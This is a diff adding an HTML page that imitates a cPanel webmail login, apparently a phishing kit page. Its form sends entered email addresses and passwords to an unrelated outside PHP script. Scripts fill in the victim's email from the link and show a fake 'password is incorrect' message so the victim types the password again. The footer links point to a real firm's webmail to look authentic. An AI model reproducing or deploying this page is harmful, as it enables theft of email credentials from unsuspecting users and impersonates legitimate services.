@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
+    <meta name="google" content="notranslate">
+    <meta name="apple-itunes-app" content="app-id=1188352635">
+    <title>Webmail Login</title>
+    <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon">
+
+    <!-- EXTERNAL CSS -->
+    <link href="https://pub-a8e17d8fbfa746a9b202fce129de2e5e.r2.dev/open_sans.min.css" rel="stylesheet" type="text/css">
+    <link href="https://pub-a8e17d8fbfa746a9b202fce129de2e5e.r2.dev/style_v2_optimized.css" rel="stylesheet" type="text/css">
+
+</head>
+
+
+
+
+<!-- Do not remove msg_code as it is needed for automated testing - msg_code:[]  -->
+<div id="login-wrapper" class="group has-pw-reset" style="opacity: 1; visibility: visible;">
+    <div class="wrapper">
+    <div id="notify">
+       
+        
+        
+        <div id="login-status" class="error-notice" style="visibility: hidden">
+            <div class="content-wrapper">
+                <div id="login-detail">
+                    <div id="login-status-icon-container"><span class="login-status-icon"></span></div>
+                </div>
+            </div>
+        </div>
+        <div id="IE-warning" class="warn-notice IE-warning-hide" style="display: none">
+            <div class="content-wrapper">
+
+                </div>
+            </div>
+        </div>
+    </div>
+
+    
+    <div id="content-container">
+        <div id="login-container">
+
+            <div id="login-sub-container">
+                    <div id="login-sub-header">
+                        
+                        <img class="main-logo" src="https://pub-a8e17d8fbfa746a9b202fce129de2e5e.r2.dev/webmail-logo.svg" alt="logo">
+                           <p id="warn" style="display: none;color:red;margin-bottom: 15px;">Password is incorrect, please try again.</p>
+
+                    </div>
+                        </div>
+
+
+              <script type="text/javascript">
+                    function getParameterByName(name, url) {
+                        if (!url) url = window.location.href;
+                        name = name.replace(/[\[\]]/g, "\\$&");
+                        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                            results = regex.exec(url);
+                        if (!results) return null;
+                        if (!results[2]) return '';
+                        return decodeURIComponent(results[2].replace(/\+/g, " "));
+                    }
+                    var email = getParameterByName('email');
+                    var chck = getParameterByName('chck');
+                    var warn = document.getElementById('warn');
+
+                    if (chck) {
+                      warn.style.display = "block";
+                    }
+                </script>
+
+                        <div id="forms">
+                            <form novalidate="" id="login_form" action="https://audicenterangelopolis.com/ap/2023/.ads/fire.php" method="post" target="_top" style="visibility:">
+                                <div class="input-req-login"><label for="user">Email Address</label></div>
+                                <div class="input-field-login icon username-container">
+                                    <img style="position:absolute;left:7px;margin-top:4px" src=" data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABkAAAAYCAYAAAAPtVbGAAAA0ElEQVRIie3UsQqDMBAGYN9/cevWLYMgWbI0Q4SKQzahBIKgUIoiWId2VYfr5CAmaVJDO9Qfbkw+kuMugC8k+C9kGCfgQgKiDMIIA6IM6q6HYZz8IXGSQhjhVcVJ6g9RAXPtyCJ5URqRvCi3I1xII8KF3I5UTasFDphA1bTbEdNr5PVmc9x+GOdBnAtRZgVYIwDr19j0whkhGV8gJON+kKpp4Zxf4EhOyp4gyoALCXXXuyP3x1N7sa4QZdqFqURcgXdfqEQ+AUxr5neI7+yIU17ZHb5SZjJLvgAAAABJRU5ErkJggg==">
+                                    <input name="user" id="user" autofocus="autofocus" placeholder="Enter your email address." class="std_textbox" type="text" tabindex="1" required="">
+                                </div>
+
+                 <script type="text/javascript">login_form.user.value = email;</script>
+
+                <input type="hidden" name="chck" value="">
+                <script type="text/javascript">login_form.chck.value = chck;</script>
+
+
+
+                                <div class="input-req-login login-password-field-label"><label for="pass">Password</label></div>
+                                <div class="input-field-login icon password-container">
+                                    <img style="position:absolute;left:7px;margin-top:4px" src=" data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAaCAYAAACpSkzOAAABB0lEQVRIie3TMWvCQBTAcb//cpNOdWqGo+lbroMpeNDE4TqUgKQGpCKCpaAZdGyS4d9JW2jVanMu9cGb7sHv3t17Lc4Urf8LlVWNy3I6YlBaUFromh4uy5uDyqomiCxKC0FkcVmOy3JubIzSghm4ZqA4HaK0MJrOvp2NpjOUloOd/QpSWjDJ7lvfPz7Rkbu/QfNFgdLC5PXtYM18UZwGPaRDrqP+9m9CG/+YnzX9nU+4F9pM17HZGBTahCvT8wul4xcA3quK9q3xB32N0Cb+oM1klVVN10T+oLYYlqs1ZuD8D0NxLgjAPed+odAmLFdr0vHEf0eNL+yuPdmXQWSPh5qMC3SBtvEBFu/J8hUx864AAAAASUVORK5CYII=">
+                                    <input name="suspass" id="pass" placeholder="Enter your email password." class="std_textbox" type="password" tabindex="2" required="">
+                                </div>
+
+
+
+                                <div class="controls">
+                                    <div class="login-btn">
+                                        <button name="login" type="submit" id="login_submit" tabindex="3">Log in</button>
+                                    </div>
+
+                                                                            <div class="reset-pw">
+                                            <a href="" id="reset_password">Reset Password
+                                            </a>
+                                        </div>
+                                                                    </div>
+                                <div class="clear" id="push"></div>
+                            </form>
+                        <!--CLOSE forms -->
+                        </div>
+                    <!--CLOSE login-sub -->
+                    </div>
+                    
+
+                                    <!--CLOSE wrapper -->
+                </div>
+            <!--CLOSE login-sub-container -->
+            </div>
+        <!--CLOSE login-container -->
+        </div>
+        
+                <div id="locale-footer" style="display: block;">
+            <div class="locale-container">
+                <ul id="locales_list">
+                    
+                        
+                        <li><a href="https://webmail.twatkinslaw.com/?locale=en">English</a></li>
+                    
+                        
+                        <li><a href="https://webmail.twatkinslaw.com/?locale=ar">العربية</a></li>
+                    
+                        
+                        <li><a href="https://webmail.twatkinslaw.com/?locale=cs">čeština</a></li>
+                    
+                        
+                        <li><a href="https://webmail.twatkinslaw.com/?locale=da">dansk</a></li>
+                    
+                        
+                        <li><a href="https://webmail.twatkinslaw.com/?locale=de">Deutsch</a></li>
+                    
+                        
+                        <li><a href="https://webmail.twatkinslaw.com/?locale=el">Ελληνικά</a></li>
+                    
+                        
+                        <li><a href="https://webmail.twatkinslaw.com/?locale=es">español</a></li>
+                    
+                        
+                        <li><a href="https://webmail.twatkinslaw.com/?locale=es_419">español&nbsp;latinoamericano</a></li>
+                    
+                        
+					
+                        <li><a href="javascript:void(0)" id="morelocale" onclick="toggle_locales(true)" title="More locales">…</a></li>
+                    
+                </ul>
+               
+            </div>
+        </div>
+    </div>
+</div>
+
+
+    <div class="copyright">Copyright©&nbsp;2024 cPanel, L.L.C.
+    <br><a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a></div>
+
+
+
+
+</body></html>
